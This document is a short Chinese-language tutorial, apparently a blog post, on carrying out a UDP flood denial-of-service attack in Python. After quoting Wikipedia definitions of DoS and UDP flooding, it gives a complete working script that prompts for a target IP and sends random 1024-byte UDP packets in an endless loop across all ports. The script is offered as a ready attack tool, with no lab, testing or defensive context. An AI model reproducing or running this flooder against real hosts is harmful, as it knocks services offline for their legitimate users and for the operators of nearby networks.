# Python 实现 DoS 攻击 —— UDP洪水攻击

## DoS 攻击

> **拒绝服务攻击**（denial-of-service attack，简称**DoS攻击**）亦称**洪水攻击**，是一种网络攻击手法，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
>
> ——维基百科

## UDP洪水攻击

> **UDP洪水攻击**（User Datagram Protocol floods）：UDP（用户数据报协议）是一种无连接协议，当数据包通过UDP发送时，所有的数据包在发送和接收时不需要进行握手验证。当大量UDP数据包发送给受害系统时，可能会导致带宽饱和从而使得合法服务无法请求访问受害系统。遭受DDoS UDP洪泛攻击时，UDP数据包的目的端口可能是随机或指定的端口，受害系统将尝试处理接收到的数据包以确定本地运行的服务。如果没有应用程序在目标端口运行，受害系统将对源IP发出ICMP数据包，表明“目标端口不可达”。某些情况下，攻击者会伪造源IP地址以隐藏自己，这样从受害系统返回的数据包不会直接回到僵尸主机，而是被发送到被伪造地址的主机。有时UDP洪泛攻击也可能影响受害系统周围的网络连接，这可能导致受害系统附近的正常系统遇到问题。然而，这取决于网络体系结构和线速。
>
> ——维基百科

## 代码实现

为了达到攻击效果，我们需要向网络上的目标主机不断发送UDP请求。

```python
from socket import *
import random

# 创建 socket 关键字
st = socket(AF_INET, SOCK_DGRAM)
# 创建随机报文数据
bytes = random._urandom(1024)

ip = input("IP Target :")
port = 1
sent = 0

print("UDP flood attack is about to begin...")

while True:
    # 发送数据
    st.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
```

